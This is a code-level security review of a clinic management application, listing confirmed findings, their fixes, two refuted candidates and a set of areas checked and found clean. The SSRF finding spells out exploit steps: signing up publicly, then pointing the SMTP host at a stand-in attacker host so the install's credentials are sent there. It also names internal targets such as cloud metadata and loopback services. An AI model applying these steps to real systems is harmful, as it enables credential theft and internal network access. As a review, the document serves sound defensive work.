# Security review — 2026-08-07

Whole-application review of `feature/windows-desktop-app` (.NET 8 API · Next.js web · WPF desktop shell ·
Android/iOS shells · PostgreSQL · MinIO · Docker Compose + Caddy).

**Method.** Candidates were identified by source exploration (the branch diff is 21 MB — too large to read as a
patch), then **each candidate was independently verified against the source by a separate reviewer** before being
reported. Two of five candidates were refuted and are recorded below so they are not re-raised.

**Result: 3 confirmed, 2 refuted.** One confirmed finding is remotely exploitable on the deployment profile
currently in use.

---

## Ordered fixes

| # | Fix | Severity | Status |
|---|---|---|---|
| **0** | Interim: unset `Notification__Smtp__Password` on the live API | — | ⬜ **Superseded by #1** — no longer needed once #1 is deployed |
| **1** | Bind each channel's secret to its URL (`ReminderSettingsProvider`) | HIGH | ✅ **Done** |
| **2** | Validate integration URLs at the write boundary | HIGH | ✅ **Done** |
| **3** | Stop reflecting gateway response bodies | MEDIUM | ✅ **Done** |
| **4** | **Rotate the four credentials exposed in git history** | HIGH | ⬜ **Outstanding — operational, only you can do it** |
| **5** | Resolve role + `IsActive` from the DB, not the JWT claim | HIGH (Auth0) | ✅ **Done** |
| **6** | Guard test for #5 | — | ✅ **Done** (`DeploymentProfileTests` needed no change — see below) |
| **7** | Correct the now-false docstrings | — | ✅ **Done** |

**Everything except #4 is implemented, and #4 is not code.** Full suite: **2230 passed, 0 failed.**

### What was built

**#1 — `ReminderSettingsProvider` resolves per CHANNEL, not per field.** `ClaimsItsOwnSms` / `…WhatsApp` /
`…Smtp` decide whether the clinic supplied *any* of a channel's endpoint, identity or secret; if so it owns the
whole channel and inherits nothing further for it. `DecryptOwn` replaced `ResolveSecret` and can no longer return
an install secret. Wording and transport details (template name/language, SMTP port, TLS flag, display name) still
inherit — they carry no credential and address no host.

**#2 — `Domain/Common/OutboundEndpoint`** validates the three tenant-settable endpoints at the write boundary
(`ClinicReminderSettings.ApplyNonSecretSettings` / `ApplySmtpSettings`, so every caller is covered): absolute
`https`, and no loopback / link-local / RFC1918 / CGNAT / unique-local / single-label host. Whether a private
address is permitted comes from the new `IOutboundEndpointPolicy` — true on `SelfHostedLan` alone, where the
private range is the clinic's own network rather than the operator's. A refusal is a French 400 on the settings
screen, not a 500.

**#3 — `HttpReminderChannelSender`** reports the status code only; the response body and exception detail go to
the log. That closes the read-back oracle on both `reminder-status` (`AdminOnly`) and `reminder-log`
(`AnyClinicRole`).

**#5 — `AccountStateMiddleware`**, registered **unconditionally in every profile**, refuses a deactivated account
and publishes the caller's **DB** role on `HttpContext.Items`; `RoleAuthorizationHandler` prefers it over the JWT
claim, falling back to the claim only when the caller has no `User` row (Cloud onboarding needs that).
`LocalAuthEnforcementMiddleware` keeps token-version revocation and the forced password change — the two things
only a self-issued JWT can have.

⚠️ **`DeploymentProfileTests` did not need changing after all**, and that is the better outcome: `EnforcesTokenState`
keeps its narrow, accurate meaning (token-version revocation) instead of being widened to mean two things. The
account-state gate simply is not a capability.

### New tests (26)

- `OutboundEndpointTests` — the internal targets that make #2 a security rule (loopback, `169.254.169.254`,
  RFC1918, compose service names, `::ffff:127.0.0.1` re-checked as IPv4), plus the LAN exception.
- `ReminderSettingsChannelIsolationTests` — the attack itself: a clinic supplying only a URL gets a **null**
  secret for that channel and the channel reads as not-configured; a clinic overriding nothing still inherits;
  ownership is per channel, not global; an undecryptable clinic secret never falls back.
- `AccountStateEnforcementTests` — a deactivated account is refused; a demoted admin is refused **while the token
  still says admin**; a promoted user is granted before their token catches up; the claim fall-back survives for
  callers with no row. Plus a source-level guard asserting the middleware is registered with **no capability gate**
  and **before `UseAuthorization`** — get that ordering wrong and the role is published too late, silently
  reverting to the claim.

⚠️ Also fixed in passing: `AuditInterceptorTests` was red on the branch (the exclusion list had gained
`ClinicSignup` without the test being updated). Its charter now names all three entries with the reason for each.

---

## Fix 1–3 · Finding A: tenant-set integration URLs leak install credentials and reach internal hosts

**HIGH · `ssrf` + `data_exposure` · confirmed 9/10 (exfiltration) and 8/10 (SSRF)**
**Affects `HostedMultiTenant` — the profile in production use.**

### The mechanism, in three parts

**No validation.** `Domain/Entities/ClinicReminderSettings.cs:220` — the entire processing applied to a URL:

```csharp
private static string? Normalize(string? value) => string.IsNullOrWhiteSpace(value) ? null : value.Trim();
```

No scheme, host, port or allow-list check exists anywhere — domain, handler or controller.

**Per-field fallback.** `Infrastructure/Services/ReminderSettingsProvider.cs:71-92` — the URL and the secret
resolve *independently*, so they can come from different tenancy levels:

```csharp
SmsApiUrl = clinic?.SmsApiUrl ?? RemindersConfig.SmsApiUrl(_configuration),          // tenant
SmsApiKey = ResolveSecret(clinic?.SmsApiKeyEncrypted, RemindersConfig.SmsApiKey(…)), // INSTALL
SmtpHost  = clinic?.SmtpHost  ?? SmtpConfig.Host(_configuration),                    // tenant
SmtpPassword = ResolveSecret(clinic?.SmtpPasswordEncrypted, SmtpConfig.Password(…)), // INSTALL
```

**The secret is sent to that host.** `Infrastructure/Services/HttpReminderChannelSender.cs:33-34`:

```csharp
using var request = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
request.Headers.TryAddWithoutValidation("Authorization", $"Bearer {bearerToken}");
```

and `SmtpDocumentEmailSender.cs:44-56` performs SMTP AUTH against `settings.SmtpHost` with the install's
username and password.

### Exploit

`GET /api/auth/mode` on the live deployment returns `publicSignupEnabled: true`, and
`LocalClinicProvisioning.cs:137-143` creates the signer as an **active admin** with `MustChangePassword: false`.
So, with no operator in the loop:

1. Any internet user completes `POST /api/auth/signup` → becomes admin of their own clinic.
2. `PUT /api/clinics/reminder-settings` with `{"smtpHost":"attacker.tld", …}` — supplying **no** password.
3. Any outbound email → the install's Brevo username and password are offered to `attacker.tld` over SMTP AUTH.

⚠️ **The exposure is per channel and depends on what the install has configured.** A channel with no install
secret is `Blocked` and leaks nothing. As of this review the deployment has **SMTP configured and SMS/WhatsApp
not**, so the live exposure is the **SMTP password**; configuring SMS or WhatsApp later arms those too.

Substituting `http://127.0.0.1:5000/hangfire/…`, `http://minio:9000/…` or `http://169.254.169.254/…` makes the
same feature an SSRF primitive originating **inside the API container** — the loopback that
`HangfireAuthorizationFilter` / `LocalRequest.IsLoopback` are built to trust. Host **and** port are fully
attacker-controlled, so this is not a path-only SSRF.

### Read-back

The gateway's response is reflected to the tenant: `HttpReminderChannelSender.cs:42-43` returns up to 200 bytes as
the error, `NotificationJob.cs:288-307` persists it, `ReminderStatusMapper.cs:33` surfaces it at
`GET /api/clinics/reminder-status` (`AdminOnly`) **and `GET /api/clinics/reminder-log` (`AnyClinicRole`)**.

⚠️ Two precisions worth keeping: the body is reflected **only on non-2xx** — a 200 is not echoed — but the status
code always is, requests are always `POST` (so GET-only internal endpoints return informative 405/400 bodies), and
timeouts are distinguishable from connection refusals. And `reminder-log` being `AnyClinicRole` means a
**secretary** can read it, while its own doc comment claims it carries "no credentials, no template bodies".

### The fixes

1. **Bind secret to URL.** In `ReminderSettingsProvider.ResolveAsync`, resolve each channel as an **atomic unit**:
   if the clinic supplied *any* of a channel's endpoint / identity / secret fields, take **all** of that channel's
   fields from the clinic and never fall back to `RemindersConfig` / `SmtpConfig` for that channel. This is the
   rule `ResolveSecret`'s own comment already claims — it just applies within a single field today.
2. **Validate at the write boundary** (`ClinicReminderSettings.ApplyNonSecretSettings` / `ApplySmtpSettings`, so
   both callers are covered): require an absolute `https://` URL, and refuse loopback, link-local
   (`169.254.0.0/16`), RFC1918, `::1` and unique-local literals. Allow `http` only under `SelfHostedLan`.
   ⚠️ A DNS-rebinding-proof version additionally needs a `SocketsHttpHandler.ConnectCallback` on the reminder
   `HttpClient` that re-checks the *resolved* address.
3. **Stop reflecting the body.** Return the status code (or a fixed French sentence) and log the body
   server-side only. At minimum drop `FailureReason` from the `AnyClinicRole` `reminder-log` response.

---

## Fix 5 · Findings B and C — `CloudBrowser` trusts the JWT for identity state

Both are confined to the **Auth0** profile. `HostedMultiTenant` and `SelfHostedLan` are **unaffected**: they mint
their own JWTs from the app's `User` row and set `EnforcesTokenState: true`, so a `TokenVersion` bump kills the old
token on the next request.

⚠️ `CloudBrowser` is **not dead code** — it is the default whenever `Deployment:Profile` is absent and
`Auth:Mode != Local` (`DeploymentProfile.cs:212-217`), and `deploy/docker-compose.prod.yml` selects it.

### Finding B — deactivating a user is a no-op (HIGH on Auth0, confirmed 9/10)

`DeploymentProfile.cs:288` sets `enforcesTokenState: false`, so `LocalAuthEnforcementMiddleware` — the only
per-request reader of live account state — is never registered (`Program.cs:583-588`). Even registered it would
skip Auth0 accounts: it guards on `account.IsLocalAccount()`, which is `PasswordHash != null`, always false in
Cloud. `IAuth0ManagementService` exposes only `UpdateUserMetadataAsync`; there is no block or revoke call.

**Impact.** An admin deactivates a departing employee. The call succeeds, `TokenVersion` is bumped, the UI shows
« Désactivé » — and the ex-employee's token keeps working *and* they can sign in at Auth0 again indefinitely.
What makes this serious is the **silent success**: there is no signal that offboarding failed.

### Finding C — a demoted admin keeps `admin` (MEDIUM-HIGH on Auth0, confirmed 8/10)

`RoleAuthorizationHandler.cs:14-18` decides authorization purely from the JWT claim, and
`ChangeUserRoleCommand` never calls `UpdateUserMetadataAsync` (its dependencies are only
`IUserRepository, IClinicContext, IUnitOfWork, ILogger`).

⚠️ **Severity corrected down from the initial report.** ~19 admin handlers re-derive the role from the database
and refuse, so `POST /api/backup`, `GET /api/outbox`, `regenerate-code` and the clinic-settings writes are **not**
retained, and the user **cannot re-escalate** (`ChangeUserRoleCommand:64` is itself DB-checked). Genuinely
retained: `DELETE /api/patients/{id}`, `GET /api/audit`, catalog and pricing writes, `DELETE /api/expenses/{id}`,
`DELETE /api/stock/{id}`.

### The shared fix

`TenantScopeMiddleware` already loads the caller's `User` row on every request via `RequestAccount.ResolveAsync`.
Put the DB `Role` and `IsActive` on `HttpContext.Items` there, and have `RoleAuthorizationHandler` prefer them over
the claim — falling back to the claim only when no row exists (Cloud onboarding, which is exactly why the
role-less `Authenticated` policy exists). One change fixes both findings and removes the standing
"19 handlers re-check, 12 do not" inconsistency.

*Minimum viable alternative:* call `UpdateUserMetadataAsync` from `ChangeUserRoleCommand` and add an Auth0
`{"blocked": true}` call to `SetUserActiveCommand`. Weaker — it leaves a propagation window until the next token
and swallows Auth0 failures.

⚠️ **Fix 6 is not optional.** `DeploymentProfileTests.cs:41` currently asserts
`EnforcesTokenState = (true, true, false)` — it pins finding B as intended behaviour, so it must change in the
same commit.

---

## Fix 4 · Credentials exposed in git history

Not a review finding — an outstanding item the repo already records at
`features/cloud-security-and-tenant-isolation/progress.md:123-125`:

> The four credentials that were committed (**Google client secret, Google refresh token, HuggingFace API key,
> DB password**) are compromised by their presence in git history and **MUST be rotated** before/at deploy.

Blanking the working tree does not undo the exposure — the history is 306 commits deep. Rotate all four at the
provider before any clinic uses the system.

---

## Refuted — do not re-raise

| Candidate | Verdict | Why |
|---|---|---|
| `POST /api/clinics/join` auto-approves an active member with only a clinic code | **REFUTED** (8/10) | The two branches it contrasted are not both reachable from that route — the pending branch is reachable only from `auth/register`, which *is* gated. `admin` cannot be self-assigned (`JoinClinicCommand.cs:75-79`). On `HostedMultiTenant` every token holder already has a `User` row, so the branch always refuses. Making the Cloud branch pending would change nothing, since `CloudBrowser` does not enforce `IsActive` at all |
| `Clinic.GoogleRefreshToken` stored in plaintext | **REFUTED** (8/10) | Facts are correct and the inconsistency with `ITtnSecretProtector` is real, but **no API surface exposes the column** — `GET google-calendar/status` returns presence booleans only, and no DTO projects it. Reaching it requires database compromise, which is the excluded "secrets at rest / hardening" class. Worth doing as engineering debt; not a vulnerability |

---

## Verified clean

Checked and found sound, with no findings:

- **SQL injection** — every `NpgsqlCommand` is a `const` string; dynamic values go through `AddWithValue`. No
  `FromSqlRaw`/`ExecuteSqlRaw` takes interpolated input. `SqlSearch`/`SearchTerm` escape LIKE wildcards.
- **Command injection** — `PgDumpBackupService` and `RestoreBackupCommand` use `ProcessStartInfo.ArgumentList`
  (never a shell string), `UseShellExecute = false`, password via `PGPASSWORD`.
- **Path traversal** — `ClinicStorageKey.Normalize` rejects `..` and leading `/`; `LocalDiskFileStorage`
  re-checks the resolved path against the base directory.
- **Multi-tenant isolation** — 31 filtered entity types, fail-closed on `Unset`; scope taken from the DB
  `User.ClinicId`, never the JWT claim; no `UseSystemWide` on any HTTP path. **The `AddClinicIdToClinicalChildren`
  migration is consistent across all four layers** — column, backfill, query filter, and required constructor
  argument at all 15 write sites — plus a derived `verify-schema` check.
- **TLS validation** — no bypass in any client: `onReceivedSslError` cancels, iOS uses `.performDefaultHandling`,
  no `ServerCertificateCustomValidationCallback`, no `NSAllowsArbitraryLoads`.
- **Secrets & randomness** — no live secrets in the working tree; security tokens use CSPRNGs; the signup token is
  SHA-256 with `FixedTimeEquals`; passwords use `PasswordHasher<User>` with rehash-on-login.
- **Auth mechanics** — no default signing key; issuer/audience/lifetime/key all validated with
  `ClockSkew = TimeSpan.Zero`; refresh and access tokens non-interchangeable via distinct audiences; no role
  self-assignment on any write path.
- **Google OAuth** — CSRF `state` is 32 CSPRNG bytes, double-submitted via HttpOnly cookie + server cache,
  consumed once.
- **XSS** — zero `dangerouslySetInnerHTML` in application code.

---

## Scope and limits

- This review reads code. **No dynamic testing, no penetration test, no dependency-vulnerability scan** was
  performed — all three remain open items in `GO-LIVE.md`.
- Findings are limited to what source review can establish. Absence of a finding in a category is **not** proof of
  absence of vulnerabilities in it.
- Deployment-level posture (CSP still report-only, no MFA, no restore drill) is tracked in `GO-LIVE.md`, not here.
